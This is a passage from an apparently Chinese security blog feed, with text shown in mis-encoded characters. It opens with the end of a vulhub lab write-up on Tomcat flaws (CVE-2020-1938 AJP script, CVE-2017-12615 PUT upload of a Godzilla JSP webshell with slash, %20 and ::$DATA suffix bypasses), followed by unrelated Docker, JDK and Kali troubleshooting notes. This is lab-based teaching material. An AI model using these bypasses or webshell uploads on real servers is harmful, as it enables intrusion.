&#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.servlet_path&#x27;, &#x27;/&#x27;]&#125;,</span><br><span class="line">])</span><br><span class="line">print(&#x27;----------------------------&#x27;)</span><br><span class="line">print(&#x27;&#x27;.join([d.data.decode(&#x27;utf_8&#x27;) for d in data]))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327215041264.png" alt="image-20250327215041264"></p><p>ç„¶åå°±èƒ½åœ¨ç›‘å¬å¤„æ‰§è¡Œå‘½ä»¤äº†ï¼Œè¯´æ˜getshellæˆåŠŸäº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327215154910.png" alt="image-20250327215154910"></p><p>åˆ°æ­¤è¯¥æ¼æ´åˆ©ç”¨ç»“æŸã€‚</p><h2 id="CVE-2017-12615">CVE-2017-12615</h2><p>PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰</p><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>win10æ”»å‡»æœºï¼š192.168.192.129</p></blockquote><h3 id="æ¼æ´åŸç†">æ¼æ´åŸç†</h3><p>ç”±äºé…ç½®ä¸å½“ï¼ˆéé»˜è®¤é…ç½®ï¼‰ï¼Œå°†é…ç½®æ–‡ä»¶conf/web.xmlä¸­çš„readonlyè®¾ç½®ä¸ºäº† falseï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨PUTæ–¹æ³•ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä½†é™åˆ¶äº†jspåç¼€çš„æ–‡ä»¶ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ readonly ä¸º trueï¼Œå½“ readonly è®¾ç½®ä¸º false æ—¶ï¼Œå¯ä»¥é€šè¿‡ PUT / DELETE è¿›è¡Œæ–‡ä»¶æ“æ§å¹¶å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><blockquote><p>å½±å“èŒƒå›´ï¼šApache Tomcat 7.0.0 - 7.0.81</p></blockquote><p>è¯¥ç‰ˆæœ¬Tomcaté…ç½®äº†å¯å†™ï¼ˆreadonly=falseï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥å¾€æœåŠ¡å™¨å†™æ–‡ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3e37200026689dd67856838a099a0b3a.png" alt="img"></p><h3 id="æ¼æ´å¤ç°-2">æ¼æ´å¤ç°</h3><p>å¼€å¯ç¯å¢ƒï¼Œå¹¶ä¸”æŸ¥çœ‹é…ç½®æ–‡ä»¶conf/web.xmlä¸­çš„readonlyæ˜¯å¦è®¾ç½®ä¸º<code> false</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -ti å®¹å™¨id bash</span><br><span class="line">cat conf/web.xml | grep readonly</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328143138882.png" alt="image-20250328143138882"></p><p>æ¥ä¸‹æ¥æŠ“åŒ…çœ‹çœ‹æ˜¯GETæ–¹æ³•ï¼Œå°†å…¶ä¿®æ”¹ä¸ºPUTæ–¹æ³•ï¼Œä¸Šä¼ ä¸€ä¸ªshell.jspï¼ˆå“¥æ–¯æ‹‰ç”Ÿæˆä¸€ä¸ªjspé©¬ï¼Œç„¶åç”¨è®°äº‹æœ¬æ‰“å¼€å¤åˆ¶ä»£ç ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328144633865.png" alt="image-20250328144633865"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328144943071.png" alt="image-20250328144943071"></p><p>å“åº”åŒ…å¯ä»¥çœ‹åˆ°æŠ¥é”™äº†ã€‚Tomcat åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ£€æŸ¥äº†æ–‡ä»¶åç¼€ï¼ˆä¸èƒ½ç›´æ¥å†™ jspï¼‰ï¼Œç›´æ¥ä¸Šä¼ å¯¼è‡´æŠ¥é”™ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡ä¸€äº›æ–‡ä»¶ç³»ç»ŸåŠŸèƒ½ç»•è¿‡é™åˆ¶ã€‚</p><h3 id="ç»•è¿‡æ–¹æ³•">ç»•è¿‡æ–¹æ³•</h3><blockquote><p>æ–¹æ³•ä¸€ï¼šä½¿ç”¨æ–œæ /ï¼Œæ–œæ åœ¨æ–‡ä»¶åä¸­æ˜¯éæ³•çš„ï¼Œæ‰€ä»¥ä¼šè¢«å»é™¤ï¼ˆLinuxå’ŒWindowsä¸­éƒ½é€‚ç”¨ï¼‰</p><p>æ–¹æ³•äºŒï¼šé¦–å…ˆä½¿ç”¨<code>%20</code>ç»•è¿‡ã€‚<code>%20</code>å¯¹åº”çš„æ˜¯ç©ºæ ¼ï¼Œåœ¨windowsä¸­è‹¥æ–‡ä»¶è¿™é‡Œåœ¨jspåé¢æ·»åŠ <code>%20</code>å³å¯è¾¾åˆ°è‡ªåŠ¨æŠ¹å»ç©ºæ ¼çš„æ•ˆæœã€‚</p><p>æ–¹æ³•ä¸‰ï¼šä½¿ç”¨Windows NTFSæµï¼Œåœ¨jspåé¢æ·»åŠ <code>::$DATA</code></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145217887.png" alt="image-20250328145217887"></p><p>ä¸Šä¼ æˆåŠŸï¼Œåœ¨dockerå®¹å™¨ä¸­çœ‹çœ‹ï¼Œå‘ç°æœ‰è¿™ä¸ªæ–‡ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145332083.png" alt="image-20250328145332083"></p><p>ä½¿ç”¨å“¥æ–¯æ‹‰è¿æ¥æ¥getshell</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145733623.png" alt="image-20250328145733623"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145804009.png" alt="image-20250328145804009"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´åŠæ¼æ´å¤ç°ï¼›ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´tomcat8åŠæ¼æ´å¤ç°ï¼›ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´CVE-2020-1938åŠæ¼æ´å¤ç°ï¼›ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´CVE-2017-12615åŠæ¼æ´å¤ç°</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>docker-composeå¯åŠ¨æŠ¥é”™ï¼ˆlibrary initialization failed - unable to allocate file descriptor table - out of memory#ï¼‰é—®é¢˜è§£å†³</title>
    <link href="https://blog.m3x1.cn/posts/eab53833.html"/>
    <id>https://blog.m3x1.cn/posts/eab53833.html</id>
    <published>2025-03-26T16:00:00.000Z</published>
    <updated>2025-04-01T02:51:03.605Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="å‰è¨€">å‰è¨€</h2><p>æˆ‘ç”¨dockerå¼€å¯å®¹å™¨é¶åœºçš„æ—¶å€™ï¼Œå‡ºç°è¿™ä¸ªæŠ¥é”™ï¼Œæœ€åå‡ºç°139æŠ¥é”™ä»£å·ï¼Œç„¶åå»ç½‘ä¸ŠæŸ¥æ‰¾å„ç§èµ„æ–™åˆ°å¤„è¯•ï¼Œæœ€åé—®é¢˜è§£å†³äº†ï¼Œç”¨è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h2><blockquote><p>library initialization failed - unable to allocate file descriptor table - out of memory#</p></blockquote><p>ç¿»è¯‘è¿‡æ¥å°±æ˜¯è¯´ï¼šåº“åˆå§‹åŒ–å¤±è´¥ - æ— æ³•åˆ†é…æ–‡ä»¶æè¿°ç¬¦è¡¨ - å†…å­˜ä¸è¶³#</p><h2 id="åŸå› ">åŸå› </h2><p>(1) LimitNOFILE=<a href="https://so.csdn.net/so/search?q=infinity&amp;spm=1001.2101.3001.7020">infinity</a> è™½ç„¶æ˜¯ä¸é™åˆ¶ï¼Œä½†æ˜¯åœ¨systemctlç‰ˆæœ¬å°äº234çš„æ—¶å€™ä¸ç”Ÿæ•ˆï¼ŒæŸ¥çœ‹systemctlç‰ˆæœ¬ï¼šsystemctl --version</p><p>(2) dockerå®¹å™¨çš„ulimitå¤ªå°äº†ï¼Œæœ‰æ–‡æ¡£è¯´å¤ªå¤§ä¹Ÿä¸è¡Œ</p><h2 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h2><h3 id="è§£å†³æ–¹æ³•ä¸€">è§£å†³æ–¹æ³•ä¸€</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ä¿®æ”¹/lib/systemd/system/docker.serviceæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">LimitCORE=infinity</span><br><span class="line">LimitNOFILE=infinity</span><br><span class="line">LimitNPROC=infinity</span><br><span class="line">æ”¹æˆ</span><br><span class="line">LimitCORE=65535</span><br><span class="line">LimitNOFILE=65535</span><br><span class="line">LimitNPROC=65535</span><br><span class="line"></span><br><span class="line">#é‡å¯dockeræœåŠ¡</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ³•äºŒ">è§£å†³æ–¹æ³•äºŒ</h3><p>é—®é¢˜<br>å› è¿å­˜ä¸è¶³æ— æ³•ç»™è¿›ç¨‹åˆ†é…æ›´å¤šçš„æ–‡ä»¶å¥æŸ„æ•°è€Œå¼‚å¸¸é€€å‡º</p><p>åŸè¿è¡ŒæŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --ulimit nofile=1024 -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><p>æ”¹ä¸º</p><h3 id="è§£å†³æ–¹æ³•ä¸‰">è§£å†³æ–¹æ³•ä¸‰</h3><p>åœ¨ /etc/systemd/system/ ç›®å½•ä¸‹ï¼Œ åˆ›å»º docker.service.d ç›®å½•<br>è¿›å…¥è¯¥ç›®å½•ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåä¸º docker.conf<br>åœ¨æ–‡ä»¶ä¸­åŠ å…¥ä»¥ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/bin/dockerd --default-ulimit nofile=65535:65535 -H fd://</span><br></pre></td></tr></table></figure><h2 id="ä¸ªäººæ€»ç»“">ä¸ªäººæ€»ç»“</h2><p>æˆ‘æ˜¯ä½¿ç”¨çš„æ–¹æ³•ä¸€ä¿®æ”¹äº†ä¸€ä¸‹ï¼Œä¿®æ”¹/lib/systemd/system/docker.serviceæ–‡ä»¶ï¼Œå¤§æ¦‚å¦‚ä¸‹å›¾ï¼š</p><p>åœ¨ExecStartåé¢åŠ ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--default-ulimit nofile=65535:65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225855172.png" alt="image-20250326225855172"></p><p>ç„¶åæŒ‰æ–¹æ³•ä¸€ä¿®æ”¹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225917085.png" alt="image-20250326225917085"></p><p>ç„¶åè®°å¾—é‡å¯docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>ä¹‹åé—®é¢˜å°±è§£å†³äº†ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§docker-composeå¯åŠ¨æŠ¥é”™ï¼ˆlibrary initialization failed - unable to allocate file descriptor table - out of memory#ï¼‰é—®é¢˜è§£å†³</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>è§£å†³win10ä½¿ç”¨jarå‘½ä»¤å‡ºç°â€jarä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤â€çš„é—®é¢˜</title>
    <link href="https://blog.m3x1.cn/posts/4de01283.html"/>
    <id>https://blog.m3x1.cn/posts/4de01283.html</id>
    <published>2025-03-26T16:00:00.000Z</published>
    <updated>2025-03-28T07:09:19.032Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="åˆ†æåŸå› ">åˆ†æåŸå› </h2><p>æ˜¯å› ä¸ºJDK11ä»¥åå°±ä¸å†é»˜è®¤åˆ›å»º â€œjreâ€ æ–‡ä»¶å¤¹å’Œå…¶å†…å®¹äº†ï¼Œéœ€è¦æ‰‹åŠ¨é…ç½®ã€‚è‡³äºå¦‚ä½•å‘ç°æ²¡æœ‰â€œjreâ€æ–‡ä»¶å¤¹çš„ï¼Œæ˜¯å› ä¸ºçœ‹ç¯å¢ƒå˜é‡çš„è·¯å¾„é‡Œæœ‰â€œjreâ€çš„æ–‡ä»¶å¤¹ï¼Œä½†æ˜¯æˆ‘å‘ç°JDKé‡Œå¹¶æ²¡æœ‰ï¼Œå°±ä¸Šç½‘ä¸€æœæ‰çŸ¥é“åŸå› ã€‚</p><h2 id="é…ç½®è¿‡ç¨‹">é…ç½®è¿‡ç¨‹</h2><p>é¦–å…ˆåœ¨ç³»ç»Ÿå˜é‡é‡Œæ–°å»º â€œJAVA_HOMEâ€ å˜é‡ï¼Œå˜é‡å€¼ä¸ºï¼šâ€œC:\Program Files\Java\jdk-11.0.9â€ ï¼ˆè·¯å¾„ä¸ºè‡ªå·±çš„javaæ–‡ä»¶è·¯å¾„ï¼Œä»¥ä¸‹çš†æ˜¯ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/04928472f8cb730ebda4a2ba1dcdafd3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨ç³»ç»Ÿå˜é‡é‡Œæ–°å»º â€œCLASSPATHâ€ å˜é‡ï¼Œå˜é‡å€¼ä¸ºï¼šâ€œ.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jarâ€</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7ea1758748f9266cd43b8d6ab6cfab4b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨ç³»ç»Ÿå˜é‡é‡Œæ‰¾åˆ°â€œPathâ€ å˜é‡ï¼Œå˜é‡å€¼ä¸ºï¼šâ€œ%JAVA_HOME%\binâ€å’Œâ€JAVA_HOME%\jre\binâ€</p><p>è¿™é‡Œæ³¨æ„ï¼Œå¦‚æœæ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºç¼–è¾‘ç•Œé¢ï¼ˆä¸‹å›¾æ˜¯é”™è¯¯ç¤ºèŒƒï¼‰ï¼Œéœ€è¦åˆ†ä¸¤è¡Œæ·»åŠ ä¸Šè¿°å˜é‡å€¼</p><p>å¦‚æœâ€å˜é‡å+å˜é‡å€¼â€œçš„æ ·å­ï¼ˆå°±åƒä¸Šé¢çš„é…ç½®å›¾å·®ä¸å¤šï¼‰ï¼Œæ‰ç”¨;è¿æ¥ï¼ˆâ€œ%JAVA_HOME%\bin;JAVA_HOME%\jre\binâ€ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d63d1cc8ee295263419c0718e809542.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ä¸‹æ¥æ˜¯é‡ç‚¹äº†ï¼š</p><p>ç”Ÿæˆ â€œjreâ€ æ–‡ä»¶å¤¹å’Œå…¶å†…å®¹ã€‚<br>è¿›å…¥åˆ°å®‰è£…ç›®å½•ä¸‹(C:\Program Files\Java\jdk-11.0.9)ï¼Œåœ¨æ­¤å¤„è¿è¡Œcmdï¼Œå†è¾“å…¥ï¼šâ€œbin\jlink.exe --module-path jmods --add-modules java.desktop --output jreâ€<br>è¿™æ—¶å€™æ¥ç€ç›´æ¥è¾“å…¥ â€œjarâ€ çš„è¯ï¼Œè¿˜æ˜¯ä¼šæœ‰é”™è¯¯ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b5371d495aabde202119568ba3c8b47a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç›´æ¥å…³æ‰ï¼Œé‡æ–°å¼€ä¸€ä¸ªcmdå°±è¡Œäº†ï¼Œç›´æ¥æŒ‰ â€œå¼€å§‹é”®â€ + â€œR&quot;ï¼Œè¾“å…¥ï¼šâ€œcmdâ€ã€‚è¿™æ—¶å€™å†è¯•è¯•ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d1016243b22e94e1a0b1aa07f73f15.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™æ ·å°±æ˜¯æˆåŠŸäº†ï¼Œç„¶åå°±èƒ½ä½¿ç”¨jaräº†ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/sinat_20593627/article/details/109613547">win10è§£å†³â€˜jarâ€™ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº çš„é—®é¢˜_jarâ€™ ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤,ä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº æˆ–æ‰¹å¤„ç†æ–‡ä»¶ã€‚-CSDNåšå®¢</a></p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§è§£å†³win10ä½¿ç”¨jarå‘½ä»¤å‡ºç°â€jarä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤â€çš„é—®é¢˜ï¼›windows10ä¸‹è½½äº†javaä½†æ˜¯æ— æ³•ä½¿ç”¨jarå‘½ä»¤çš„é—®é¢˜åŸå› å’Œé—®é¢˜è§£å†³</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>kaliæ‰©å±•ç¡¬ç›˜ï¼Œä»¥åŠå¯¼è‡´å¼€æœºå»¶è¿Ÿé—®é¢˜ï¼Œä¸€ç›´å¡åœ¨ç™»å½•ç•Œé¢çš„é—®é¢˜è§£å†³</title>
    <link href="https://blog.m3x1.cn/posts/3b44ba93.html"/>
    <id>https://blog.m3x1.cn/posts/3b44ba93.html</id>
    <published>2025-03-25T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.600Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ‰©å±•ç¡¬ç›˜">æ‰©å±•ç¡¬ç›˜</h2><p>ä»Šå¤©æˆ‘å› ä¸ºçœ‹åˆ°åŸæ¥çš„kaliè™šæ‹Ÿæœºåªæœ‰20gå†…å­˜ï¼Œå°±æƒ³æ‰©å±•ä¸€ä¸‹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101617857-2116683396.png" alt="image-20220829233729344"></p><p>ç‚¹å¼€ä¸Šé¢è¿™ä¸ªç¡¬ç›˜è¿™ä¸€æ </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101618295-1284516527.png" alt="image-20220829233757522"></p><p>ç‚¹å¼€ä¹‹åç‚¹å‡»æ‰©å±•ï¼Œç„¶åé€‰æ‹©è‡ªå·±æƒ³è¦æ‰©å±•çš„ç©ºé—´ï¼Œè¿™é‡Œæ ¹æ®è‡ªå·±æƒ…å†µè‡ªå·±å†³å®š</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101618752-1960261044.png" alt="image-20220829233824985"></p><p>åœ¨ä¸Šè¿°æ‰©å±•ç£ç›˜å®¹é‡ä¹‹åï¼Œå¹¶ä¸ä¼šç›´æ¥æŠŠå®¹é‡æ‰©å±•åˆ°ç³»ç»Ÿç›˜é‡Œï¼Œè¿˜éœ€è¦æˆ‘ä»¬è‡ªå·±å»åˆ†é…ã€‚</p><p>å³ä¸Šè§’æœç´¢Gpartedï¼Œkaliæœ‰ä¸€ä¸ªè‡ªå¸¦çš„åˆ†é…ç£ç›˜ç©ºé—´çš„å·¥å…·</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619237-528678126.png" alt="image-20220830090014908"></p><p>æœ¬æ¥æ˜¯è¿™æ ·ä¸€ä¸ªç•Œé¢</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619573-866531015.png" alt="image-20220830090052673"></p><p>ç„¶åå³é”®ç‚¹å‡»åœç”¨äº¤æ¢ç©ºé—´ï¼Œç„¶åæŠŠä¸­é—´è¿™ä¸¤ä¸ªåˆ†åŒºåˆ é™¤ï¼Œåªå‰©ä¸‹sda1é‚£ä¸ªåˆ†åŒºï¼Œå› ä¸ºå¦‚æœå­˜åœ¨ä¸­é—´è¿™ä¸¤ä¸ªåˆ†åŒºï¼Œå°±ä¸èƒ½æŠŠæ‰©å±•çš„ç£ç›˜ç©ºé—´åˆ†é…ç»™ç³»ç»Ÿç›˜äº†ã€‚</p><p>ä¸­é—´çš„åŒºåŸŸåˆ é™¤ä¹‹åï¼Œå°±ä¼šåªå‰©ä¸‹ä¸€ä¸ªsda1é‚£ä¸ªåˆ†åŒºï¼Œç„¶åå°±å¯ä»¥å¼€å§‹è°ƒæ•´å¤§å°äº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101619970-1314137064.png" alt="image-20220830090331897"></p><p>ç„¶åä¸‹é¢è¿™ä¸ªåœ°æ–¹å°±ä¼šå˜åŒ–ï¼Œå˜æˆä½ ä¹‹å‰æ‰©å±•çš„ç©ºé—´å®¹é‡</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620377-953480513.png" alt="image-20220830090502454"></p><p>ç„¶åä½ è‡ªè¡Œè¿›è¡Œåˆ†é…å³å¯ï¼Œä¸è¿‡è¿™é‡Œæ³¨æ„è¦ç•™å‡ºä¸€äº›ç©ºé—´ç»™äº¤æ¢åŒºåŸŸï¼Œå› ä¸ºæˆ‘ä»¬åé¢è¿˜æ˜¯è¦é‡æ–°å»ºå›åŸæ¥çš„é‚£ä¸ªswapåˆ†åŒº</p><p>å¦‚æœä½ ç•™æœ‰ä¸€éƒ¨åˆ†ç©ºé—´çš„è¯ï¼Œåº”è¯¥æ˜¯å¯ä»¥ç‚¹å‡»æ–°å»ºåˆ†åŒºçš„</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620763-1046461728.png" alt="image-20220830090933936"></p><p>æ–°å»ºçš„åˆ†åŒºæ–‡ä»¶ç³»ç»Ÿè¦å’ŒåŸæ¥ä¸€æ ·ï¼ŒåŸæ¥æ˜¯extendedçš„ï¼Œæ–°å»ºçš„åˆ†åŒºä¹Ÿè¦æ˜¯extendedçš„ï¼Œç„¶åé‚£ä¸ªswapåˆ†åŒºä¹Ÿè¦åœ¨è¿™ä¸ªextendedåˆ†åŒºä¹‹ä¸‹å»å»ºç«‹ã€‚ç„¶åå®Œæˆåå¼€æœºå‘ç°å˜å¾—å¾ˆæ…¢ã€‚</p><h2 id="å¼€æœºå»¶è¿Ÿé—®é¢˜è§£å†³">å¼€æœºå»¶è¿Ÿé—®é¢˜è§£å†³</h2><p>å› ä¸ºæœ‰ä¸€ä¸ªå…³äºuuidçš„ä¿¡æ¯æˆ‘ä»¬è¿˜æ²¡æœ‰ä¿®æ”¹ã€‚</p><p>åœ¨linuxä¸­ï¼Œuuidæ˜¯é€šç”¨å”¯ä¸€è¯†åˆ«ç ã€‚uuidæ˜¯ä¸€ä¸ªè½¯ä»¶å»ºæ„çš„æ ‡å‡†ï¼Œç›®çš„å°±æ˜¯è®©åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€ç”¨å…ƒç´ éƒ½èƒ½æœ‰å”¯ä¸€çš„è¾¨è¯†èµ„è®¯ï¼Œä»è€Œä¸éœ€è¦é€è¿‡ä¸­å¤®æ§åˆ¶ç«¯æ¥åšè¯†åˆ«èµ„è®¯çš„æŒ‡å®š</p><p>å¤§æ¦‚æ„æ€å°±æ˜¯ä¸€ä¸ªè¯†åˆ«ç ï¼Œå¦‚æœä½ æ²¡æœ‰è¿›è¡Œé‡æ–°ä¿®æ”¹çš„è¯ï¼Œä½ å¼€æœºçš„æ—¶å€™è¿˜æ˜¯ä¼šå»å¯»æ‰¾åŸæ¥çš„uuidï¼Œå› ä¸ºæˆ‘ä»¬è¿™é‡Œå·²ç»åˆ é™¤é‡å»ºè¿‡äº†åˆ†åŒºï¼Œæ‰€ä»¥å®ƒçš„uuidç ä¹Ÿå‘ç”Ÿäº†å˜åŒ–</p><p>é€šè¿‡ä¸‹é¢è¿™ä¸ªå‘½ä»¤å¯ä»¥æŸ¥çœ‹uuidç </p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo blkid</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621219-13902332.png" alt="image-20220830091830957"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸¤ä¸ªæ–‡ä»¶çš„uuidç </p><p>åˆ†åˆ«æ˜¯/etc/fstabå’Œ/etc/initramfs-tools/conf.d/resume</p><p>æˆ‘ä»¬å¯ä»¥ç”¨vimæ‰“å¼€ï¼Œå¦‚æœä½ æœ‰å…¶å®ƒç¼–è¾‘å™¨ï¼Œä¹Ÿå¯ä»¥ç”¨å…¶å®ƒç¼–è¾‘å™¨</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br><span class="line">sudo vim /etc/initramfs-tools/conf.d/resume</span><br></pre></td></tr></table></figure><p>å¯èƒ½ä¼šå‡ºç°ä¸‹é¢çš„ç•Œé¢ï¼Œç›´æ¥æŒ‰Eå¼€å§‹ç¼–è¾‘å°±å¯ä»¥</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621646-272993183.png" alt="image-20220830092204947"></p><p>æ¥ä¸‹å»å°±æ˜¯vimçš„ä¸€ä¸ªç¼–è¾‘ç•Œé¢</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101622029-954380503.png" alt="image-20220830092232770"></p><p>éœ€è¦æŠŠä¸Šé¢çš„ä¸¤ä¸ªuuidåˆ†åˆ«æ”¹æˆå¯¹åº”çš„uuidï¼Œå› ä¸ºç³»ç»Ÿç›˜æ²¡å˜ï¼Œæ‰€ä»¥è¿™ä¸ªext4çš„uuidä¸€èˆ¬æ˜¯ä¸éœ€è¦æ”¹å˜çš„ï¼Œä¸€èˆ¬è¦æ”¹çš„å°±æ˜¯ä¸‹é¢çš„è¿™ä¸ªswapçš„uuidã€‚æ”¹å®Œä¿å­˜åé‡å¯å³å¯ã€‚</p>]]></content>
    
    
